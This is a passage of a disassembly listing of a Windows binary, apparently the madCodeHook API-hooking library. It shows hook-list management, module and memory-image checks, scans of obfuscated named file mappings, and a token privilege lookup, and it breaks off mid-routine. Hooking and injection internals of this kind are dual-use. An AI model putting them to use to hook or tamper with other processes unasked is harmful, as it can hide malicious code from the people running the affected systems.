		mov	[ebp+var_4], 0FFFFFFFFh
		mov	ecx, ds:dword_4176F0
		mov	edx, [ecx+edx*8+18h]
		mov	[ebp+var_8], edx
		jmp	short loc_410FC1
; ---------------------------------------------------------------------------

loc_410FBB:				; CODE XREF: sub_410F44+5Fj
		dec	eax
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_410F94

loc_410FC1:				; CODE XREF: sub_410F44+4Ej
					; sub_410F44+75j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410FE0

loc_410FCE:				; CODE XREF: sub_410F44+9Aj
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_410FD9:				; DATA XREF: sub_410F44+36o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410FCE
; ---------------------------------------------------------------------------

loc_410FE0:				; CODE XREF: sub_410F44+94j
					; DATA XREF: sub_410F44+85o
		cmp	[ebp+var_8], 0
		jz	short loc_410FEE
		mov	eax, [ebp+var_8]
		call	sub_41004C

loc_410FEE:				; CODE XREF: sub_410F44+1Ej
					; sub_410F44+A0j
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		mov	eax, [ebp+var_4]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_410F44	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411004	proc near		; CODE XREF: sub_411004+169p
					; sub_411004+181p ...

var_D		= byte ptr -0Dh
var_C		= dword	ptr -0Ch
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_6], cl
		mov	[ebp+var_5], dl
		mov	[ebp+var_4], eax
		mov	[ebp+var_7], 0
		cmp	ds:byte_416B08,	0
		jz	loc_4111A2
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	edx, edx
		push	ebp
		push	offset loc_411121
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		xor	eax, eax
		mov	[ebp+var_C], eax
		mov	eax, ds:dword_4176F0
		call	sub_404564
		mov	ebx, eax
		cmp	ebx, 0
		jl	short loc_4110C4

loc_411055:				; CODE XREF: sub_411004+BEj
		lea	edi, [ebx+ebx*4]
		mov	eax, ds:dword_4176F0
		mov	eax, [eax+edi*8+1Ch]
		mov	edx, [ebp+var_4]
		cmp	eax, edx
		jnz	short loc_4110BE
		mov	[ebp+var_7], 1
		mov	eax, ds:dword_4176F0
		mov	eax, [eax+edi*8+18h]
		mov	[ebp+var_C], eax
		mov	eax, ds:dword_4176F0
		call	sub_404564
		mov	esi, eax
		mov	eax, ds:dword_4176F0
		lea	eax, [eax+edi*8]
		lea	edx, [esi+esi*4]
		mov	ecx, ds:dword_4176F0
		lea	edx, [ecx+edx*8]
		mov	ecx, off_4107F0
		call	sub_4041F8
		push	esi
		mov	eax, offset dword_4176F0
		mov	ecx, 1
		mov	edx, off_410820
		call	sub_404718
		add	esp, 4
		jmp	short loc_4110C4
; ---------------------------------------------------------------------------

loc_4110BE:				; CODE XREF: sub_411004+62j
		dec	ebx
		cmp	ebx, 0FFFFFFFFh
		jnz	short loc_411055

loc_4110C4:				; CODE XREF: sub_411004+4Fj
					; sub_411004+B8j
		cmp	[ebp+var_7], 0
		jz	short loc_4110D0
		cmp	[ebp+var_5], 0
		jz	short loc_4110D4

loc_4110D0:				; CODE XREF: sub_411004+C4j
		xor	eax, eax
		jmp	short loc_4110D6
; ---------------------------------------------------------------------------

loc_4110D4:				; CODE XREF: sub_411004+CAj
		mov	al, 1

loc_4110D6:				; CODE XREF: sub_411004+CEj
		mov	[ebp+var_D], al
		cmp	[ebp+var_D], 0
		jz	short loc_411109
		mov	eax, ds:dword_4176F0
		call	sub_404564
		test	eax, eax
		jl	short loc_411109
		inc	eax
		xor	ebx, ebx

loc_4110F0:				; CODE XREF: sub_411004+103j
		lea	edx, [ebx+ebx*4]
		mov	ecx, ds:dword_4176F0
		cmp	dword ptr [ecx+edx*8], 0
		jz	short loc_411105
		mov	[ebp+var_D], 0
		jmp	short loc_411109
; ---------------------------------------------------------------------------

loc_411105:				; CODE XREF: sub_411004+F9j
		inc	ebx
		dec	eax
		jnz	short loc_4110F0

loc_411109:				; CODE XREF: sub_411004+D9j
					; sub_411004+E7j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411128

loc_411116:				; CODE XREF: sub_411004+122j
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_411121:				; DATA XREF: sub_411004+30o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411116
; ---------------------------------------------------------------------------

loc_411128:				; CODE XREF: sub_411004+11Cj
					; DATA XREF: sub_411004+10Do
		cmp	[ebp+var_7], 0
		jz	short loc_4111A2
		cmp	[ebp+var_C], 0
		jz	short loc_411147
		mov	al, [ebp+var_6]
		xor	al, 1
		mov	edx, [ebp+var_C]
		mov	[edx+2Dh], al
		mov	eax, [ebp+var_C]
		call	sub_402D18

loc_411147:				; CODE XREF: sub_411004+12Ej
		cmp	[ebp+var_6], 0
		jz	short loc_411154
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax], edx

loc_411154:				; CODE XREF: sub_411004+147j
		cmp	[ebp+var_D], 0
		jz	short loc_4111A2
		cmp	ds:dword_416B0C, 0
		jz	short loc_411172
		mov	eax, offset dword_416B0C
		mov	cl, [ebp+var_6]
		mov	dl, 1
		call	sub_411004

loc_411172:				; CODE XREF: sub_411004+15Dj
		cmp	ds:dword_416B10, 0
		jz	short loc_41118A
		mov	eax, offset dword_416B10
		mov	cl, [ebp+var_6]
		mov	dl, 1
		call	sub_411004

loc_41118A:				; CODE XREF: sub_411004+175j
		cmp	ds:dword_416B14, 0
		jz	short loc_4111A2
		mov	eax, offset dword_416B14
		mov	cl, [ebp+var_6]
		mov	dl, 1
		call	sub_411004

loc_4111A2:				; CODE XREF: sub_411004+1Dj
					; sub_411004+128j ...
		mov	al, [ebp+var_7]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_411004	endp

; ---------------------------------------------------------------------------
off_4111AC	dd offset dword_4111B0	; DATA XREF: sub_4111D4+77r
					; sub_4111D4+1E7r
dword_4111B0	dd 302E0311h, 2835h	; DATA XREF: CODE:off_4111ACo
		db 0
		dd offset off_4107F0
		db 3 dup(0FFh)
		db 0FFh
		dd offset off_4107F0
		db 0Bh,	6Dh, 61h
		dd 646F4364h, 6F6F4865h, 408D6Bh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4111D4	proc near		; CODE XREF: sub_410848+47p
					; sub_4108A0+59p ...

var_18		= dword	ptr -18h
dwErrCode	= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE8h
		push	ebx
		push	esi
		push	edi
		xor	edx, edx
		mov	[ebp+var_18], edx
		mov	[ebp+var_8], edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_4113C7
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	eax, eax
		push	ebp
		push	offset loc_411399
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetLastError
		mov	[ebp+dwErrCode], eax
		test	ebx, ebx
		jz	loc_411386
		cmp	ds:byte_416B08,	0
		jz	loc_411386
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	eax, eax
		push	ebp
		push	offset loc_4112BF
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, ds:dword_4176F0
		call	sub_40455C
		push	eax
		lea	eax, [ebp+var_8]
		mov	ecx, 1
		mov	edx, off_4111AC
		call	sub_404718
		add	esp, 4
		xor	eax, eax
		mov	[ebp+var_4], eax
		mov	eax, ds:dword_4176F0
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_4112A7
		inc	esi
		xor	edi, edi

loc_411271:				; CODE XREF: sub_4111D4+D1j
		lea	ebx, [edi+edi*4]
		mov	eax, ds:dword_4176F0
		cmp	dword ptr [eax+ebx*8+8], 0
		jz	short loc_4112A3
		mov	eax, [ebp+var_4]
		lea	eax, [eax+eax*4]
		mov	edx, [ebp+var_8]
		lea	eax, [edx+eax*8]
		mov	edx, ds:dword_4176F0
		lea	edx, [edx+ebx*8]
		mov	ecx, off_4107F0
		call	sub_4041F8
		inc	[ebp+var_4]

loc_4112A3:				; CODE XREF: sub_4111D4+AAj
		inc	edi
		dec	esi
		jnz	short loc_411271

loc_4112A7:				; CODE XREF: sub_4111D4+98j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4112C6

loc_4112B4:				; CODE XREF: sub_4111D4+F0j
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_4112BF:				; DATA XREF: sub_4111D4+59o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4112B4
; ---------------------------------------------------------------------------

loc_4112C6:				; CODE XREF: sub_4111D4+EAj
					; DATA XREF: sub_4111D4+DBo
		mov	esi, [ebp+var_4]
		dec	esi
		test	esi, esi
		jl	loc_411386
		inc	esi
		xor	edi, edi

loc_4112D5:				; CODE XREF: sub_4111D4+1ACj
		lea	eax, [edi+edi*4]
		mov	edx, [ebp+var_8]
		lea	ebx, [edx+eax*8]
		cmp	dword ptr [ebx+8], 0
		jz	loc_41137E
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_411307
		mov	eax, [ebx+8]
		call	sub_403E24
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	[ebp+var_C], eax
		jmp	short loc_411313
; ---------------------------------------------------------------------------

loc_411307:				; CODE XREF: sub_4111D4+11Ej
		mov	eax, [ebx+0Ch]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	[ebp+var_C], eax

loc_411313:				; CODE XREF: sub_4111D4+131j
		mov	eax, [ebx+10h]
		call	sub_403E24
		mov	edx, eax
		lea	eax, [ebp+var_18]
		call	sub_403B8C
		mov	edx, [ebp+var_18]
		mov	eax, [ebp+var_C]
		call	sub_406960
		call	sub_40CA04
		mov	[ebp+var_10], eax
		cmp	dword ptr [ebx+18h], 0
		jz	short loc_411346
		mov	eax, [ebx+14h]
		cmp	eax, [ebp+var_10]
		jz	short loc_411375

loc_411346:				; CODE XREF: sub_4111D4+168j
		mov	eax, [ebx+1Ch]
		mov	cl, 1
		mov	dl, 1
		call	sub_411004
		mov	eax, [ebx+10h]
		push	eax
		mov	eax, [ebp+var_10]
		push	eax
		mov	eax, [ebx+20h]
		push	eax
		mov	eax, [ebx+1Ch]
		push	eax
		mov	eax, [ebx+24h]
		push	eax
		mov	ecx, [ebx+8]
		mov	eax, [ebx]
		mov	edx, [ebp+var_C]
		call	sub_410970
		jmp	short loc_41137E
; ---------------------------------------------------------------------------

loc_411375:				; CODE XREF: sub_4111D4+170j
		mov	eax, [ebx+1Ch]
		push	eax
		call	sub_410F44

loc_41137E:				; CODE XREF: sub_4111D4+10Ej
					; sub_4111D4+19Fj
		inc	edi
		dec	esi
		jnz	loc_4112D5

loc_411386:				; CODE XREF: sub_4111D4+39j
					; sub_4111D4+46j ...
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_4113A3
; ---------------------------------------------------------------------------

loc_411399:				; DATA XREF: sub_4111D4+24o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_4113A3:				; CODE XREF: sub_4111D4+1C3j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4113CE

loc_4113B0:				; CODE XREF: sub_4111D4+1F8j
		lea	eax, [ebp+var_18]
		call	sub_403994
		lea	eax, [ebp+var_8]
		mov	edx, off_4111AC
		call	sub_404724
		retn
; ---------------------------------------------------------------------------

loc_4113C7:				; DATA XREF: sub_4111D4+16o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4113B0
; ---------------------------------------------------------------------------

loc_4113CE:				; CODE XREF: sub_4111D4+1F2j
					; DATA XREF: sub_4111D4+1D7o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4111D4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4113D8	proc near		; CODE XREF: sub_410E30+CBp

Buffer		= _MEMORY_BASIC_INFORMATION ptr	-30h
dwErrCode	= dword	ptr -14h
var_E		= word ptr -0Eh
lpAddress	= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD0h
		push	ebx
		mov	[ebp+var_4], ebp
		xor	eax, eax
		mov	[ebp+var_8], eax
		call	GetLastError
		mov	[ebp+dwErrCode], eax
		push	0
		lea	edx, [ebp+var_4]
		mov	ecx, 4
		mov	eax, [ebp+var_4]
		call	sub_409CC0
		test	al, al
		jz	loc_411526
		push	0
		lea	edx, [ebp+lpAddress]
		mov	eax, [ebp+var_4]
		add	eax, 4
		mov	ecx, 4
		call	sub_409CC0
		test	al, al
		jz	loc_411526
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebp+lpAddress]
		push	eax		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_41145C
		push	0
		lea	edx, [ebp+var_E]
		mov	ecx, 2
		mov	eax, [ebp+Buffer.AllocationBase]
		call	sub_409CC0
		test	al, al
		jz	short loc_41145C
		cmp	[ebp+var_E], 5A4Dh
		jz	loc_411520

loc_41145C:				; CODE XREF: sub_4113D8+60j
					; sub_4113D8+76j
		cmp	ds:byte_416B08,	0
		jz	loc_411526
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	edx, edx
		push	ebp
		push	offset loc_411519
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, ds:dword_4176F0
		call	sub_404564
		mov	ebx, eax
		cmp	ebx, 0
		jl	short loc_411501

loc_411492:				; CODE XREF: sub_4113D8+127j
		lea	eax, [ebx+ebx*4]
		mov	edx, ds:dword_4176F0
		mov	eax, [edx+eax*8+18h]
		test	eax, eax
		jz	short loc_4114FB
		cmp	dword ptr [eax+28h], 0
		jz	short loc_4114FB
		mov	edx, [eax+28h]
		cmp	edx, [ebp+lpAddress]
		ja	short loc_4114FB
		mov	eax, [eax+28h]
		add	eax, 0F50h
		cmp	eax, [ebp+lpAddress]
		jbe	short loc_4114FB
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebp+lpAddress]
		inc	eax
		mov	eax, [eax]
		push	eax		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_411501
		push	0
		lea	edx, [ebp+var_E]
		mov	ecx, 2
		mov	eax, [ebp+Buffer.AllocationBase]
		call	sub_409CC0
		test	al, al
		jz	short loc_411501
		cmp	[ebp+var_E], 5A4Dh
		jnz	short loc_411501
		mov	eax, [ebp+Buffer.AllocationBase]
		mov	[ebp+var_8], eax
		jmp	short loc_411501
; ---------------------------------------------------------------------------

loc_4114FB:				; CODE XREF: sub_4113D8+C9j
					; sub_4113D8+CFj ...
		dec	ebx
		cmp	ebx, 0FFFFFFFFh
		jnz	short loc_411492

loc_411501:				; CODE XREF: sub_4113D8+B8j
					; sub_4113D8+FBj ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411526

loc_41150E:				; CODE XREF: sub_4113D8+146j
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_411519:				; DATA XREF: sub_4113D8+9Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41150E
; ---------------------------------------------------------------------------

loc_411520:				; CODE XREF: sub_4113D8+7Ej
		mov	eax, [ebp+Buffer.AllocationBase]
		mov	[ebp+var_8], eax

loc_411526:				; CODE XREF: sub_4113D8+2Bj
					; sub_4113D8+48j ...
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		mov	eax, [ebp+var_8]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4113D8	endp

; ---------------------------------------------------------------------------
		align 4
off_411538	dd offset dword_41153C	; DATA XREF: sub_411560+7Cr
					; sub_411560+13Dr
dword_41153C	dd 322E0311h, 435h, 0	; DATA XREF: CODE:off_411538o
		dd 0FFFFFF00h, 0FFh, 616D0B00h,	646F4364h, 6F6F4865h, 408D6Bh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411560	proc near		; CODE XREF: sub_4116B8+1A6p
					; sub_411AA8+5p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		push	esi
		push	edi
		xor	ecx, ecx
		mov	[ebp+var_8], ecx
		mov	[ebp+var_1], dl
		mov	edi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_4116A9
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		test	edi, edi
		jz	loc_41168D
		cmp	ds:byte_416B08,	0
		jz	loc_41168D
		push	offset stru_4176D8 ; lpCriticalSection
		call	EnterCriticalSection_0
		xor	edx, edx
		push	ebp
		push	offset loc_411667
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		cmp	ds:dword_416B18, 0
		jz	short loc_4115C9
		mov	eax, ds:dword_416B18
		push	eax		; hObject
		call	CloseHandle
		xor	eax, eax
		mov	ds:dword_416B18, eax

loc_4115C9:				; CODE XREF: sub_411560+55j
		mov	eax, ds:dword_4176F0
		call	sub_40455C
		push	eax
		lea	eax, [ebp+var_8]
		mov	ecx, 1
		mov	edx, off_411538
		call	sub_404718
		add	esp, 4
		xor	eax, eax
		mov	[ebp+var_C], eax
		mov	eax, ds:dword_4176F0
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_41164F
		inc	esi
		xor	ebx, ebx

loc_411602:				; CODE XREF: sub_411560+EDj
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_41160D
		cmp	[ebp+var_1], 0
		jz	short loc_41161B

loc_41160D:				; CODE XREF: sub_411560+A5j
		lea	edx, [ebx+ebx*4]
		mov	ecx, ds:dword_4176F0
		cmp	edi, [ecx+edx*8]
		jnz	short loc_41164B

loc_41161B:				; CODE XREF: sub_411560+ABj
		lea	eax, [ebx+ebx*4]
		mov	edx, ds:dword_4176F0
		mov	eax, [edx+eax*8+18h]
		test	eax, eax
		jz	short loc_411632
		cmp	byte ptr [eax+24h], 0
		jnz	short loc_41164B

loc_411632:				; CODE XREF: sub_411560+CAj
		lea	eax, [ebx+ebx*4]
		mov	edx, ds:dword_4176F0
		mov	eax, [edx+eax*8+1Ch]
		mov	edx, [ebp+var_8]
		mov	ecx, [ebp+var_C]
		mov	[edx+ecx*4], eax
		inc	[ebp+var_C]

loc_41164B:				; CODE XREF: sub_411560+B9j
					; sub_411560+D0j
		inc	ebx
		dec	esi
		jnz	short loc_411602

loc_41164F:				; CODE XREF: sub_411560+9Dj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41166E

loc_41165C:				; CODE XREF: sub_411560+10Cj
		push	offset stru_4176D8 ; lpCriticalSection
		call	LeaveCriticalSection_0
		retn
; ---------------------------------------------------------------------------

loc_411667:				; DATA XREF: sub_411560+43o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41165C
; ---------------------------------------------------------------------------

loc_41166E:				; CODE XREF: sub_411560+106j
					; DATA XREF: sub_411560+F7o
		mov	esi, [ebp+var_C]
		dec	esi
		test	esi, esi
		jl	short loc_41168D
		inc	esi
		xor	ebx, ebx

loc_411679:				; CODE XREF: sub_411560+12Bj
		mov	eax, [ebp+var_8]
		mov	eax, [eax+ebx*4]
		mov	cl, [ebp+var_1]
		xor	edx, edx
		call	sub_411004
		inc	ebx
		dec	esi
		jnz	short loc_411679

loc_41168D:				; CODE XREF: sub_411560+23j
					; sub_411560+30j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4116B0

loc_41169A:				; CODE XREF: sub_411560+14Ej
		lea	eax, [ebp+var_8]
		mov	edx, off_411538
		call	sub_404724
		retn
; ---------------------------------------------------------------------------

loc_4116A9:				; DATA XREF: sub_411560+16o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41169A
; ---------------------------------------------------------------------------

loc_4116B0:				; CODE XREF: sub_411560+148j
					; DATA XREF: sub_411560+135o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_411560	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4116B8	proc near		; DATA XREF: sub_410970+3F9o

var_728		= dword	ptr -728h
var_724		= dword	ptr -724h
var_708		= dword	ptr -708h
var_704		= dword	ptr -704h
ModuleName	= word ptr -700h
var_288		= byte ptr -288h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
lpBaseAddress	= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFF8F8h
		push	ebx
		push	esi
		push	edi
		xor	edx, edx
		mov	[ebp+var_704], edx
		mov	[ebp+var_708], edx
		mov	[ebp+var_14], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_411889
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_9], 0
		mov	edi, 1

loc_4116EF:				; CODE XREF: sub_4116B8+195j
		mov	bl, 1
		lea	edx, [ebp+var_704]
		mov	eax, offset dword_4118A0
		call	sub_4064CC
		mov	eax, [ebp+var_704]
		push	eax
		lea	eax, [ebp+var_708]
		lea	edx, [edi+30h]
		call	sub_403B7C
		mov	ecx, [ebp+var_708]
		lea	eax, [ebp+var_14]
		pop	edx
		call	sub_403C70
		push	0
		mov	eax, [ebp+var_14]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	esi, eax
		test	esi, esi
		jz	loc_411844
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	esi		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_41183E
		mov	eax, [ebp+lpBaseAddress]
		mov	edx, [eax+4]
		mov	eax, [eax]
		push	edx
		push	eax
		mov	eax, [ebp+var_14]
		mov	edx, [eax+4]
		mov	eax, [eax]
		cmp	edx, [esp+728h+var_724]
		jnz	short loc_411775
		cmp	eax, [esp+728h+var_728]

loc_411775:				; CODE XREF: sub_4116B8+B8j
		pop	edx
		pop	eax
		jnz	loc_411835
		xor	ebx, ebx
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax+8]
		dec	eax
		test	eax, eax
		jl	loc_411835
		inc	eax
		mov	[ebp+var_18], eax
		mov	[ebp+var_8], 0

loc_411799:				; CODE XREF: sub_4116B8+177j
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_4117E9
		imul	eax, [ebp+var_8], 8Fh
		mov	edx, [ebp+lpBaseAddress]
		push	esi
		push	edi
		lea	esi, [edx+eax*8+0Ch]
		lea	edi, [ebp+ModuleName]
		mov	ecx, 11Eh
		rep movsd
		pop	edi
		pop	esi
		cmp	[ebp+ModuleName], 0
		jnz	short loc_4117D2
		mov	bl, 1
		jmp	short loc_411835
; ---------------------------------------------------------------------------

loc_4117D2:				; CODE XREF: sub_4116B8+114j
		lea	eax, [ebp+ModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		cmp	eax, [ebp+var_4]
		jnz	short loc_411829
		mov	[ebp+var_9], 1
		jmp	short loc_411835
; ---------------------------------------------------------------------------

loc_4117E9:				; CODE XREF: sub_4116B8+EBj
		imul	eax, [ebp+var_8], 4Eh
		mov	edx, [ebp+lpBaseAddress]
		push	esi
		push	edi
		lea	esi, [edx+eax*8+0Ch]
		lea	edi, [ebp+var_288]
		mov	ecx, 9Ch
		rep movsd
		pop	edi
		pop	esi
		cmp	[ebp+var_288], 0
		jnz	short loc_411812
		mov	bl, 1
		jmp	short loc_411835
; ---------------------------------------------------------------------------

loc_411812:				; CODE XREF: sub_4116B8+154j
		lea	eax, [ebp+var_288]
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		cmp	eax, [ebp+var_4]
		jnz	short loc_411829
		mov	[ebp+var_9], 1
		jmp	short loc_411835
; ---------------------------------------------------------------------------

loc_411829:				; CODE XREF: sub_4116B8+129j
					; sub_4116B8+169j
		inc	[ebp+var_8]
		dec	[ebp+var_18]
		jnz	loc_411799

loc_411835:				; CODE XREF: sub_4116B8+BFj
					; sub_4116B8+D0j ...
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile

loc_41183E:				; CODE XREF: sub_4116B8+9Cj
		push	esi		; hObject
		call	CloseHandle

loc_411844:				; CODE XREF: sub_4116B8+81j
		or	bl, [ebp+var_9]
		jnz	short loc_411853
		inc	edi
		cmp	edi, 0Ah
		jnz	loc_4116EF

loc_411853:				; CODE XREF: sub_4116B8+18Fj
		cmp	[ebp+var_9], 0
		jnz	short loc_411863
		mov	dl, 1
		mov	eax, [ebp+var_4]
		call	sub_411560

loc_411863:				; CODE XREF: sub_4116B8+19Fj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_411890

loc_411870:				; CODE XREF: sub_4116B8+1D6j
		lea	eax, [ebp+var_708]
		mov	edx, 2
		call	sub_4039B8
		lea	eax, [ebp+var_14]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_411889:				; DATA XREF: sub_4116B8+23o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_411870
; ---------------------------------------------------------------------------

loc_411890:				; CODE XREF: sub_4116B8+1D0j
					; DATA XREF: sub_4116B8+1B3o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4116B8	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_4118A0	dd 6673638h, 1F1C1102h,	0 ; DATA XREF: sub_4116B8+3Fo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4118AC	proc near		; CODE XREF: sub_411A80+19p

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
Luid		= _LUID	ptr -10h
BufferLength	= dword	ptr -8
hObject		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE0h
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+var_20], eax
		mov	[ebp+var_1C], eax
		xor	eax, eax
		push	ebp
		push	offset loc_411A37
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+hObject]
		push	eax		; TokenHandle
		push	28h		; DesiredAccess
		call	GetCurrentProcess
		push	eax		; ProcessHandle
		call	OpenProcessToken
		test	eax, eax
		jz	loc_411A1C
		xor	eax, eax
		push	ebp
		push	offset loc_411A15
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	eax, eax
		mov	[ebp+BufferLength], eax
		lea	eax, [ebp+BufferLength]
		push	eax		; ReturnLength
		push	0		; TokenInformationLength
		push	0		; TokenInformation
		push	3		; TokenInformationClass
		mov	eax, [ebp+hObject]
		push	eax		; TokenHandle
		call	GetTokenInformation
		cmp	[ebp+BufferLength], 0
		jz	loc_4119FE
		mov	eax, [ebp+BufferLength]
		add	eax, eax
		push	eax		; uBytes
		push	40h		; uFlags
		call	LocalAlloc_1
		mov	ebx, eax
		lea	eax, [ebp+BufferLength]
		push	eax		; ReturnLength
		mov	eax, [ebp+BufferLength]
		add	eax, eax
		push	eax		; TokenInformationLength
		push	ebx		; TokenInformation
		push	3		; TokenInformationClass
		mov	eax, [ebp+hObject]
		push	eax		; TokenHandle
		call	GetTokenInformation
		test	eax, eax
		jz	loc_4119F8
		lea	eax, [ebp+Luid]
		push	eax		; lpLuid
		lea	edx, [ebp+var_1C]
		mov	eax, offset dword_411A50
		call	sub_4064CC
		mov	eax, [ebp+var_1C]
		call	sub_403E24
		push	eax		; lpName
		push	0		; lpSystemName
		call	LookupPrivilegeValueA
		test	eax, eax
		jnz	short loc_411974
		mov	[ebp+Luid.LowPart], 0
		mov	[ebp+Luid.HighPart], 0

loc_411974:				; CODE XREF: sub_4118AC+B8j
		lea	eax, [ebp+var_18]
		push	eax		; lpLuid
		lea	edx, [ebp+var_20]
